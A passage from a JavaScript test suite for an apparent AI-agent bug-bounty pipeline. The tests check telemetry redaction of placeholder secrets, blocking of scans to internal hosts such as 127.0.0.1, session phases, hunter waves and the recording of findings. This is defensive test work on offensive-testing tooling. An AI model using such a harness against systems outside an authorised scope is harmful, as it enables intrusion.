      assert.equal(authFailure.error.code, "INVALID_ARGUMENTS");

      const authSuccess = await executeTool("bounty_auth_store", {
        target_domain: "example.com",
        profile_name: "attacker",
        headers: { Authorization: "Bearer raw-auth-token" },
        cookies: { session: "raw-cookie-value" },
        local_storage: { access_token: "raw-local-storage-token" },
        credentials: {
          email: "a@example.com",
          password: "stored-secret-password",
        },
      });
      assert.equal(authSuccess.ok, true);

      const httpBlocked = await executeTool("bounty_http_scan", {
        method: "POST",
        url: "http://127.0.0.1/?token=raw-query-token",
        target_domain: "example.com",
        headers: { Authorization: "Bearer request-header-token" },
        body: "request-body-secret",
        block_internal_hosts: true,
      });
      assert.equal(httpBlocked.error.code, "SCOPE_BLOCKED");

      const artifact = await executeTool("bounty_import_static_artifact", {
        target_domain: "example.com",
        artifact_type: "evm_token_contract",
        content: "contract Secret { string constant password = 'static-artifact-secret'; }",
        label: "token",
      });
      assert.equal(artifact.ok, true);

      const telemetry = JSON.stringify(readJsonl(toolTelemetryPath()));
      for (const forbidden of [
        "super-secret-password",
        "raw-auth-token",
        "raw-cookie-value",
        "raw-local-storage-token",
        "stored-secret-password",
        "raw-query-token",
        "request-header-token",
        "request-body-secret",
        "static-artifact-secret",
      ]) {
        assert.equal(telemetry.includes(forbidden), false, `${forbidden} leaked into telemetry`);
      }

      const authRows = readJsonl(toolTelemetryPath())
        .filter((row) => row.tool === "bounty_auth_store" && row.ok === false);
      assert.equal(authRows.length, 1);
      assert.equal(Object.prototype.hasOwnProperty.call(authRows[0], "error_message"), false);
    });
  });
});

test("tool telemetry reader summarizes at read time and skips malformed lines", () => {
  const telemetryRoot = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-telemetry-"));
  const env = { ...process.env, BOUNTY_TELEMETRY: "1", BOUNTY_TELEMETRY_DIR: telemetryRoot };
  try {
    const base = {
      version: 1,
      ts: "2026-04-24T00:00:00.000Z",
      ok: true,
      error_code: null,
      target_domain: "example.com",
      wave: null,
      agent: null,
      surface_id: null,
      registry: null,
    };
    appendToolTelemetryEvent({ ...base, tool: "bounty_http_scan", elapsed_ms: 10 }, { env });
    appendToolTelemetryEvent({
      ...base,
      tool: "bounty_http_scan",
      ok: false,
      elapsed_ms: 20,
      error_code: "SCOPE_BLOCKED",
      error_message: "blocked",
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    }, { env });
    appendToolTelemetryEvent({ ...base, tool: "bounty_http_scan", elapsed_ms: 30 }, { env });
    appendToolTelemetryEvent({
      ...base,
      tool: "bounty_read_session_state",
      ok: false,
      elapsed_ms: 40,
      error_code: "NOT_FOUND",
      error_message: "Missing session state",
    }, { env });
    appendToolTelemetryEvent({
      ...base,
      tool: "bounty_http_scan",
      target_domain: "other.example",
      elapsed_ms: 50,
    }, { env });
    fs.appendFileSync(toolTelemetryPath(env), "{not-json\n", "utf8");

    const summary = readToolTelemetry({ target_domain: "example.com", limit: 2 }, { env });
    assert.equal(summary.enabled, true);
    assert.equal(summary.total_events, 4);
    assert.equal(summary.malformed_lines, 1);
    assert.equal(summary.totals.calls, 4);
    assert.equal(summary.totals.successes, 2);
    assert.equal(summary.totals.failures, 2);
    assert.equal(summary.totals.success_rate, 0.5);
    assert.deepEqual(summary.totals.error_codes, {
      SCOPE_BLOCKED: 1,
      NOT_FOUND: 1,
    });

    const httpSummary = summary.tools.find((toolSummary) => toolSummary.tool === "bounty_http_scan");
    assert.ok(httpSummary);
    assert.equal(httpSummary.calls, 3);
    assert.equal(httpSummary.successes, 2);
    assert.equal(httpSummary.failures, 1);
    assert.equal(httpSummary.success_rate, 0.6667);
    assert.deepEqual(httpSummary.latency_ms, { p50: 20, p95: 30 });
    assert.deepEqual(httpSummary.error_codes, { SCOPE_BLOCKED: 1 });
    assert.equal(httpSummary.last_call.elapsed_ms, 30);
    assert.equal(httpSummary.recent_failures.length, 1);
    assert.equal(httpSummary.recent_failures[0].error_message, "blocked");

    const filtered = readToolTelemetry({ tool: "bounty_http_scan" }, { env });
    assert.equal(filtered.total_events, 4);
    assert.equal(filtered.tools.length, 1);
    assert.equal(filtered.tools[0].tool, "bounty_http_scan");
    assert.equal(filtered.tools[0].calls, 4);
  } finally {
    fs.rmSync(telemetryRoot, { recursive: true, force: true });
  }
});

test("tool telemetry reader can include filtered hunter run telemetry summaries", () => {
  const telemetryRoot = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-telemetry-"));
  const env = { ...process.env, BOUNTY_TELEMETRY: "1", BOUNTY_TELEMETRY_DIR: telemetryRoot };
  try {
    const allowed = buildAgentRunTelemetryEvent({
      run_type: "hunter",
      status: "allowed",
      target_domain: "example.com",
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      transcript_path: "/tmp/transcript-a.jsonl",
      handoff: {
        present: true,
        valid: true,
        provenance: "verified",
        surface_status: "complete",
        summary_present: true,
        chain_notes_count: 1,
      },
      coverage: { total: 2, by_status: { tested: 1, promising: 1 } },
      findings: { count: 1 },
      now: new Date("2026-04-24T00:00:00.000Z"),
    });
    const missing = buildAgentRunTelemetryEvent({
      run_type: "hunter",
      status: "blocked",
      block_code: "missing_handoff",
      target_domain: "example.com",
      wave: "w1",
      agent: "a2",
      surface_id: "surface-b",
      transcript_path: "/tmp/transcript-b.jsonl",
      handoff: { present: false, valid: false },
      now: new Date("2026-04-24T00:01:00.000Z"),
    });
    const other = buildAgentRunTelemetryEvent({
      run_type: "hunter",
      status: "blocked",
      block_code: "malformed_marker",
      target_domain: "other.example",
      wave: "w2",
      agent: "a1",
      surface_id: "surface-x",
      now: new Date("2026-04-24T00:02:00.000Z"),
    });
    appendAgentRunTelemetryEvent(allowed, { env });
    appendAgentRunTelemetryEvent(missing, { env });
    appendAgentRunTelemetryEvent(other, { env });
    fs.appendFileSync(agentRunTelemetryPath(env), "{not-json\n", "utf8");

    const withoutRuns = readToolTelemetry({ target_domain: "example.com" }, { env });
    assert.equal(Object.prototype.hasOwnProperty.call(withoutRuns, "agent_runs"), false);

    const summary = readToolTelemetry({ include_agent_runs: true, target_domain: "example.com", limit: 2 }, { env });
    assert.equal(summary.total_events, 0);
    assert.equal(summary.agent_runs.total_runs, 2);
    assert.equal(summary.agent_runs.malformed_lines, 1);
    assert.deepEqual(summary.agent_runs.totals.by_status, { allowed: 1, blocked: 1 });
    assert.deepEqual(summary.agent_runs.totals.by_block_code, { missing_handoff: 1 });
    assert.equal(summary.agent_runs.latest_run.run_id, missing.run_id);
    assert.equal(summary.agent_runs.recent_blocked_runs.length, 1);
    assert.equal(summary.agent_runs.recent_blocked_runs[0].block_code, "missing_handoff");

    const filtered = readToolTelemetry({
      include_agent_runs: true,
      target_domain: "example.com",
      agent_run_type: "hunter",
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    }, { env });
    assert.equal(filtered.agent_runs.total_runs, 1);
    assert.equal(filtered.agent_runs.latest_run.run_id, allowed.run_id);
    assert.deepEqual(filtered.agent_runs.latest_run.coverage.by_status, { tested: 1, promising: 1 });
    assert.equal(filtered.agent_runs.latest_run.findings.count, 1);
  } finally {
    fs.rmSync(telemetryRoot, { recursive: true, force: true });
  }
});

test("pipeline analytics records metadata-only events for a complete synthetic run", () => {
  withTempHome(() => {
    const domain = "example.com";
    const rawPocSecret = "pipeline-raw-poc-secret";
    const rawHandoffSecret = "pipeline-raw-handoff-secret";
    const rawCoverageSecret = "pipeline-raw-coverage-secret";

    JSON.parse(initSession({ target_domain: domain, target_url: "https://example.com" }));
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], priority: "HIGH" }]);
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "AUTH" }));
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "HUNT", auth_status: "authenticated" }));
    const started = JSON.parse(startWave({
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    }));

    JSON.parse(logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [{
        endpoint: "/api/export",
        method: "GET",
        bug_class: "idor",
        status: "tested",
        evidence_summary: rawCoverageSecret,
      }],
    }));
    JSON.parse(recordFinding({
      target_domain: domain,
      title: "IDOR on export",
      severity: "high",
      endpoint: "/api/export",
      description: "Cross-account export is possible.",
      proof_of_concept: rawPocSecret,
      response_evidence: "metadata-only analytics must not copy this evidence",
      impact: "PII disclosure.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    }));
    JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: started.assignments[0].handoff_token,
      summary: "surface complete",
      chain_notes: ["chain context"],
      content: `# Handoff\n\n${rawHandoffSecret}`,
    }));
    JSON.parse(applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }));
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "CHAIN" }));
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "VERIFY" }));

    const verified = [{
      finding_id: "F-1",
      disposition: "confirmed",
      severity: "high",
      reportable: true,
      reasoning: "Confirmed.",
    }];
    for (const round of ["brutalist", "balanced", "final"]) {
      JSON.parse(writeVerificationRound({ target_domain: domain, round, notes: null, results: verified }));
    }
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "GRADE" }));
    JSON.parse(writeGradeVerdict({
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 45,
      findings: [{
        finding_id: "F-1",
        impact: 20,
        proof_quality: 10,
        severity_accuracy: 5,
        chain_potential: 5,
        report_quality: 5,
        total_score: 45,
        feedback: null,
      }],
      feedback: null,
    }));
    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "REPORT" }));
    writeFileAtomic(reportMarkdownPath(domain), "# Report\n");

    const rows = readJsonl(pipelineEventsJsonlPath(domain));
    assert.ok(rows.length >= 10);
    assert.deepEqual(new Set(rows.map((row) => row.type)), new Set([
      "session_started",
      "phase_transitioned",
      "wave_started",
      "coverage_logged",
      "finding_recorded",
      "wave_merged",
      "verification_written",
      "grade_written",
    ]));
    assert.equal(rows.every((row) => row.target_domain === domain), true);
    assert.equal(rows.some((row) => row.type === "finding_recorded" && row.counts.findings === 1), true);

    const analyticsText = readPipelineAnalytics({ target_domain: domain, include_events: true, limit: 100 });
    const analytics = JSON.parse(analyticsText);
    assert.equal(analytics.mode, "session");
    assert.equal(analytics.event_log.exists, true);
    assert.equal(analytics.event_log.backfilled, false);
    assert.equal(analytics.sessions[0].health.status, "healthy");
    assert.equal(analytics.sessions[0].phase, "REPORT");
    assert.equal(analytics.sessions[0].findings.total, 1);
    assert.equal(analytics.sessions[0].final_verification_count, 1);
    assert.equal(analytics.sessions[0].grade_verdict, "SUBMIT");
    assert.equal(analytics.sessions[0].report_present, true);
    assert.equal(analytics.funnel.reached.REPORT, 1);
    assert.equal(analytics.bottlenecks.length, 0);

    for (const forbidden of [rawPocSecret, rawHandoffSecret, rawCoverageSecret, "metadata-only analytics must not copy this evidence"]) {
      assert.equal(analyticsText.includes(forbidden), false, `${forbidden} leaked into pipeline analytics`);
      assert.equal(JSON.stringify(rows).includes(forbidden), false, `${forbidden} leaked into pipeline events`);
    }
  });
});

test("pipeline analytics backfills legacy sessions from artifacts without an event log", () => {
  withTempHome(() => {
    const domain = "legacy.example";
    seedSessionState(domain, {
      phase: "REPORT",
      hunt_wave: 1,
      pending_wave: null,
      total_findings: 1,
      explored: ["surface-a"],
      auth_status: "authenticated",
    });
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], priority: "HIGH" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeFileAtomic(path.join(sessionDir(domain), "handoff-w1-a1.json"), `${JSON.stringify({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      dead_ends: [],
      waf_blocked_endpoints: [],
      lead_surface_ids: [],
    }, null, 2)}\n`);
    writeFileAtomic(findingsJsonlPath(domain), `${JSON.stringify({ target_domain: domain, severity: "high" })}\n`);
    for (const round of ["brutalist", "balanced", "final"]) {
      writeFileAtomic(verificationRoundPaths(domain, round).json, `${JSON.stringify({
        version: 1,
        target_domain: domain,
        round,
        results: [{ finding_id: "F-1", disposition: "confirmed", severity: "high", reportable: true }],
      }, null, 2)}\n`);
    }
    writeFileAtomic(gradeArtifactPaths(domain).json, `${JSON.stringify({
      version: 1,
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 45,
      findings: [{ finding_id: "F-1", total_score: 45 }],
    }, null, 2)}\n`);
    writeFileAtomic(reportMarkdownPath(domain), "# Legacy report\n");

    assert.equal(fs.existsSync(pipelineEventsJsonlPath(domain)), false);
    assert.equal(sessionsRoot(), path.join(process.env.HOME, "bounty-agent-sessions"));

    const eventRead = readPipelineEvents(domain);
    assert.equal(eventRead.backfilled, true);
    assert.equal(eventRead.events.some((event) => event.source === "artifact_backfill"), true);

    const analytics = JSON.parse(readPipelineAnalytics({ target_domain: domain, include_events: true }));
    assert.equal(analytics.event_log.backfilled, true);
    assert.equal(analytics.sessions[0].health.status, "healthy");
    assert.equal(analytics.sessions[0].report_present, true);
    assert.equal(analytics.events.some((event) => event.source === "artifact_backfill"), true);

    const crossSession = JSON.parse(readPipelineAnalytics({ window_days: 1 }));
    assert.equal(crossSession.mode, "cross_session");
    assert.ok(crossSession.sessions.some((session) => session.target_domain === domain));
    assert.equal(crossSession.funnel.sessions_total, 1);
  });
});

test("pipeline analytics flags blocked pending waves and malformed event lines", () => {
  withTempHome(() => {
    const domain = "blocked.example";
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1, hunt_wave: 0 });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    fs.mkdirSync(sessionDir(domain), { recursive: true });
    fs.appendFileSync(pipelineEventsJsonlPath(domain), "{not-json\n", "utf8");
    fs.appendFileSync(pipelineEventsJsonlPath(domain), `${JSON.stringify({
      version: 1,
      ts: "2026-04-24T00:00:00.000Z",
      target_domain: domain,
      type: "wave_started",
      wave_number: 1,
      status: "started",
      source: "test",
      counts: { assignments: 1 },
    })}\n`, "utf8");

    const summary = readSessionArtifactSummary(domain);
    assert.equal(summary.state.pending_wave, 1);
    assert.equal(summary.waves[0].missing_agents.length, 1);

    const analytics = JSON.parse(readPipelineAnalytics({ target_domain: domain, include_events: true }));
    assert.equal(analytics.event_log.malformed_lines, 1);
    assert.equal(analytics.event_log.backfilled, false);
    assert.equal(analytics.sessions[0].health.status, "blocked");
    assert.ok(analytics.sessions[0].health.reasons.includes("hunter_handoff_failures"));
    assert.ok(analytics.bottlenecks.some((bottleneck) => bottleneck.code === "hunter_handoff_failures"));
    assert.ok(analytics.next_actions.some((action) => /handoffs/.test(action.action)));
  });
});

test("MCP message handler lists tools, routes calls, serializes envelopes, and wraps thrown errors", async () => {
  const sent = [];
  const calls = [];
  const successEnvelope = {
    ok: true,
    data: { args: { x: 1 } },
    meta: { tool: "bounty_fake", version: 1 },
  };
  const handleMessage = createMcpMessageHandler({
    tools: [{ name: "bounty_fake", inputSchema: { type: "object" } }],
    executeTool: async (name, args) => {
      calls.push({ name, args });
      if (name === "bounty_throw") {
        throw new Error("boom");
      }
      return successEnvelope;
    },
    send: (message) => sent.push(message),
  });

  await handleMessage({ jsonrpc: "2.0", id: 1, method: "tools/list" });
  await handleMessage({
    jsonrpc: "2.0",
    id: 2,
    method: "tools/call",
    params: { name: "bounty_fake", arguments: { x: 1 } },
  });
  await handleMessage({
    jsonrpc: "2.0",
    id: 3,
    method: "tools/call",
    params: { name: "bounty_throw", arguments: {} },
  });

  assert.deepEqual(sent[0], {
    jsonrpc: "2.0",
    id: 1,
    result: { tools: [{ name: "bounty_fake", inputSchema: { type: "object" } }] },
  });
  assert.deepEqual(calls, [
    { name: "bounty_fake", args: { x: 1 } },
    { name: "bounty_throw", args: {} },
  ]);
  assert.equal(sent[1].result.content[0].type, "text");
  assert.equal(sent[1].result.content[0].text, JSON.stringify(successEnvelope));
  assert.deepEqual(JSON.parse(sent[1].result.content[0].text), successEnvelope);
  assert.deepEqual(JSON.parse(sent[2].result.content[0].text), {
    ok: false,
    error: { code: "INTERNAL_ERROR", message: "boom" },
    meta: { tool: "bounty_throw", version: 1 },
  });
});

test("stdio transport accepts framed and raw JSON-RPC messages", () => {
  const framedOutput = [];
  const framedServer = createStdioServer({
    tools: [],
    executeTool: async () => ({ ok: true }),
    stdin: {
      setEncoding() {},
      on() {},
    },
    stdout: { write: (chunk) => framedOutput.push(String(chunk)) },
    stderr: { write() {} },
  });
  const framedBody = JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping" });

  framedServer.handleChunk(`Content-Length: ${Buffer.byteLength(framedBody)}\r\n\r\n${framedBody}`);

  const framedResponse = framedOutput.join("");
  const framedPayload = JSON.parse(framedResponse.slice(framedResponse.indexOf("\r\n\r\n") + 4));
  assert.deepEqual(framedPayload, { jsonrpc: "2.0", id: 1, result: {} });

  const rawOutput = [];
  const rawServer = createStdioServer({
    tools: [],
    executeTool: async () => ({ ok: true }),
    stdin: {
      setEncoding() {},
      on() {},
    },
    stdout: { write: (chunk) => rawOutput.push(String(chunk)) },
    stderr: { write() {} },
  });

  rawServer.handleChunk(`${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "ping" })}\n`);

  assert.deepEqual(JSON.parse(rawOutput.join("").trim()), { jsonrpc: "2.0", id: 2, result: {} });
});

test("bounty_init_session creates the initial state and bounty_read_session_state returns public fields only", () => {
  withTempHome(() => {
    const domain = "example.com";
    const targetUrl = "https://example.com";
    const expectedState = {
      target: domain,
      target_url: targetUrl,
      phase: "RECON",
      hunt_wave: 0,
      pending_wave: null,
      total_findings: 0,
      explored: [],
      dead_ends: [],
      waf_blocked_endpoints: [],
      lead_surface_ids: [],
      scope_exclusions: [],
      hold_count: 0,
      auth_status: "pending",
    };

    const created = JSON.parse(initSession({ target_domain: domain, target_url: targetUrl }));
    assert.deepEqual(created, {
      version: 1,
      created: true,
      session_dir: sessionDir(domain),
      state: expectedState,
    });

    const rawState = JSON.parse(fs.readFileSync(statePath(domain), "utf8"));
    assert.deepEqual(rawState, expectedState);
    assert.deepEqual(JSON.parse(readSessionState({ target_domain: domain })), {
      version: 1,
      state: expectedState,
    });
  });
});

test("bounty_init_session rejects existing state and non-empty session dirs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "RECON" });
    assert.throws(
      () => initSession({ target_domain: domain, target_url: "https://example.com" }),
      /Session already initialized:/,
    );

    const otherDomain = "example.org";
    const otherDir = sessionDir(otherDomain);
    fs.mkdirSync(otherDir, { recursive: true });
    fs.writeFileSync(path.join(otherDir, "stray.txt"), "x");
    assert.throws(
      () => initSession({ target_domain: otherDomain, target_url: "https://example.org" }),
      /Session directory is not empty:/,
    );
  });
});

test("bounty_init_session ignores .session.lock when checking if the session dir is empty", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });
    fs.mkdirSync(sessionLockPath(domain));

    const staleDate = new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000);
    fs.utimesSync(sessionLockPath(domain), staleDate, staleDate);

    const result = JSON.parse(initSession({ target_domain: domain, target_url: "https://example.com" }));
    assert.equal(result.created, true);
    assert.ok(fs.existsSync(statePath(domain)));
  });
});

test("missing session state errors surface on read and mutating state tools", () => {
  withTempHome(() => {
    const domain = "example.com";

    assert.throws(() => readSessionState({ target_domain: domain }), /Missing session state:/);
    assert.throws(() => transitionPhase({ target_domain: domain, to_phase: "AUTH" }), /Missing session state:/);
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 1, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      /Missing session state:/,
    );
    assert.throws(
      () => applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }),
      /Missing session state:/,
    );
  });
});

test("legacy state normalization is applied while unknown fields remain on disk across writes", () => {
  withTempHome(() => {
    const domain = "example.com";
    writeFileAtomic(statePath(domain), `${JSON.stringify({
      target: "other.com",
      target_url: "https://example.com",
      phase: "RECON",
      extra_field: "keep-me",
    }, null, 2)}\n`);

    assert.deepEqual(JSON.parse(readSessionState({ target_domain: domain })), {
      version: 1,
      state: {
        target: domain,
        target_url: "https://example.com",
        phase: "RECON",
        hunt_wave: 0,
        pending_wave: null,
        total_findings: 0,
        explored: [],
        dead_ends: [],
        waf_blocked_endpoints: [],
        lead_surface_ids: [],
        scope_exclusions: [],
        hold_count: 0,
        auth_status: "pending",
      },
    });

    JSON.parse(transitionPhase({ target_domain: domain, to_phase: "AUTH" }));
    const rawState = JSON.parse(fs.readFileSync(statePath(domain), "utf8"));
    assert.equal(rawState.extra_field, "keep-me");
    assert.equal(rawState.target, domain);
    assert.equal(rawState.phase, "AUTH");
  });
});

test("malformed legacy state hard-fails session reads", () => {
  withTempHome(() => {
    const domain = "example.com";
    writeFileAtomic(statePath(domain), `${JSON.stringify({
      target_url: "https://example.com",
      phase: "BOGUS",
    }, null, 2)}\n`);

    assert.throws(() => readSessionState({ target_domain: domain }), /Malformed session state:/);
  });
});

test("bounty_transition_phase allows the configured edges and increments hold_count on GRADE -> HUNT", () => {
  withTempHome(() => {
    const domain = "example.com";
    const cases = [
      { from: "RECON", to: "AUTH" },
      { from: "AUTH", to: "HUNT", auth_status: "authenticated" },
      { from: "HUNT", to: "CHAIN" },
      { from: "CHAIN", to: "VERIFY" },
      { from: "VERIFY", to: "GRADE" },
      { from: "GRADE", to: "REPORT" },
      { from: "GRADE", to: "HUNT", hold_count: 1 },
    ];

    for (const scenario of cases) {
      seedSessionState(domain, {
        phase: scenario.from,
        hold_count: scenario.hold_count ?? 0,
      });

      const result = JSON.parse(transitionPhase({
        target_domain: domain,
        to_phase: scenario.to,
        auth_status: scenario.auth_status,
      }));

      assert.equal(result.transitioned, true);
      assert.equal(result.from_phase, scenario.from);
      assert.equal(result.to_phase, scenario.to);
      assert.equal(result.state.phase, scenario.to);

      if (scenario.from === "AUTH") {
        assert.equal(result.state.auth_status, "authenticated");
      }
      if (scenario.from === "GRADE" && scenario.to === "HUNT") {
        assert.equal(result.state.hold_count, 2);
      }
    }
  });
});

test("bounty_transition_phase rejects invalid edges and stray auth_status", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "RECON" });
    assert.throws(
      () => transitionPhase({ target_domain: domain, to_phase: "HUNT" }),
      /Invalid phase transition: RECON -> HUNT/,
    );
    assert.throws(
      () => transitionPhase({ target_domain: domain, to_phase: "AUTH", auth_status: "authenticated" }),
      /auth_status is only allowed for AUTH -> HUNT/,
    );

    seedSessionState(domain, { phase: "AUTH" });
    assert.throws(
      () => transitionPhase({ target_domain: domain, to_phase: "HUNT" }),
      /auth_status is required for AUTH -> HUNT/,
    );
  });
});

test("session lock busy blocks mutating tools and stale locks are recoverable", () => {
  withTempHome(() => {
    const domain = "example.com";
    fs.mkdirSync(sessionDir(domain), { recursive: true });
    fs.mkdirSync(sessionLockPath(domain));

    assert.throws(
      () => transitionPhase({ target_domain: domain, to_phase: "AUTH" }),
      new RegExp(`Session lock busy: ${sessionDir(domain).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`),
    );
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 1, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      new RegExp(`Session lock busy: ${sessionDir(domain).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`),
    );
    assert.throws(
      () => applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }),
      new RegExp(`Session lock busy: ${sessionDir(domain).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`),
    );
    assert.throws(
      () => initSession({ target_domain: domain, target_url: "https://example.com" }),
      new RegExp(`Session lock busy: ${sessionDir(domain).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`),
    );

    const staleDate = new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000);
    fs.utimesSync(sessionLockPath(domain), staleDate, staleDate);
    const created = JSON.parse(initSession({ target_domain: domain, target_url: "https://example.com" }));
    assert.equal(created.created, true);
  });
});

test("bounty_start_wave validates inputs, writes assignments, and updates pending_wave", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1 });
    seedAttackSurface(domain, ["surface-a", "surface-b"]);
    const expectedState = {
      target: domain,
      phase: "HUNT",
      hunt_wave: 1,
      pending_wave: 2,
      total_findings: 0,
      explored_count: 0,
      dead_ends_count: 0,
      waf_blocked_count: 0,
      lead_surface_ids: [],
      hold_count: 0,
      auth_status: "pending",
    };

    const result = JSON.parse(startWave({
      target_domain: domain,
      wave_number: 2,
      assignments: [
        { agent: "a1", surface_id: "surface-a" },
        { agent: "a2", surface_id: "surface-b" },
      ],
    }));

    assert.deepEqual({
      ...result,
      assignments: result.assignments.map(({ handoff_token, ...assignment }) => {
        assert.match(handoff_token, /^[A-Za-z0-9_-]{32}$/);
        return assignment;
      }),
    }, {
      version: 1,
      started: true,
      wave_number: 2,
      assignments: [
        { agent: "a1", surface_id: "surface-a" },
        { agent: "a2", surface_id: "surface-b" },
      ],
      assignments_path: path.join(sessionDir(domain), "wave-2-assignments.json"),
      state: expectedState,
    });
    const assignmentDoc = JSON.parse(fs.readFileSync(path.join(sessionDir(domain), "wave-2-assignments.json"), "utf8"));
    assert.ok(assignmentDoc.assignments.every((assignment) => /^[a-f0-9]{64}$/.test(assignment.handoff_token_sha256)));
    assert.doesNotMatch(JSON.stringify(assignmentDoc), new RegExp(result.assignments[0].handoff_token));
  });
});

test("bounty_start_wave rejects invalid state, duplicate inputs, and pre-existing assignment files", () => {
  withTempHome(() => {
    const domain = "example.com";

    seedSessionState(domain, { phase: "AUTH" });
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 1, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      /Wave start requires phase HUNT or EXPLORE/,
    );

    seedSessionState(domain, { phase: "HUNT", pending_wave: 3 });
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 4, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      /Wave start requires pending_wave null/,
    );

    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1 });
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 5, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      /wave_number must equal hunt_wave \+ 1/,
    );
    assert.throws(
      () => startWave({
        target_domain: domain,
        wave_number: 2,
        assignments: [
          { agent: "a1", surface_id: "surface-a" },
          { agent: "a1", surface_id: "surface-b" },
        ],
      }),
      /Duplicate assignment for a1/,
    );
    assert.throws(
      () => startWave({
        target_domain: domain,
        wave_number: 2,
        assignments: [
          { agent: "a1", surface_id: "surface-a" },
          { agent: "a2", surface_id: "surface-a" },
        ],
      }),
      /Duplicate surface_id in assignments: surface-a/,
    );
    seedAttackSurface(domain, ["surface-a"]);
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 2, assignments: [{ agent: "a1", surface_id: "surface-z" }] }),
      /Unknown surface_id in assignments: surface-z/,
    );

    seedAssignments(domain, 2, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(
      () => startWave({ target_domain: domain, wave_number: 2, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
      /Assignment file already exists:/,
    );
  });
});

test("bounty_start_wave rolls back the assignment file if the state write fails", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a"]);

    const originalRenameSync = fs.renameSync;
    fs.renameSync = (from, to) => {
      if (to === statePath(domain)) {
        throw new Error("boom");
      }
      return originalRenameSync(from, to);
    };

    try {
      assert.throws(
        () => startWave({ target_domain: domain, wave_number: 1, assignments: [{ agent: "a1", surface_id: "surface-a" }] }),
        /State write failed after writing assignments; rollback succeeded:/,
      );
    } finally {
      fs.renameSync = originalRenameSync;
    }

    assert.ok(!fs.existsSync(path.join(sessionDir(domain), "wave-1-assignments.json")));
    assert.equal(JSON.parse(fs.readFileSync(statePath(domain), "utf8")).pending_wave, null);
  });
});

test("bounty_apply_wave_merge returns pending without mutating state when handoffs are incomplete", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
    });

    const before = fs.readFileSync(statePath(domain), "utf8");
    const result = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));

    assert.deepEqual(result, {
      version: 1,
      status: "pending",
      wave_number: 1,
      force_merge: false,
      readiness: {
        assignments_total: 2,
        handoffs_total: 1,
        received_agents: ["a1"],
        missing_agents: ["a2"],
        unexpected_agents: [],
        is_complete: false,
      },
      state: JSON.parse(readStateSummary({ target_domain: domain })).state,
    });
    assert.equal(fs.readFileSync(statePath(domain), "utf8"), before);
  });
});

test("bounty_apply_wave_merge merges state, findings, requeues, and scope exclusions", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, {
      phase: "HUNT",
      pending_wave: 1,
      dead_ends: ["/existing"],
      waf_blocked_endpoints: ["/old-waf"],
      lead_surface_ids: ["surface-c"],
    });
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
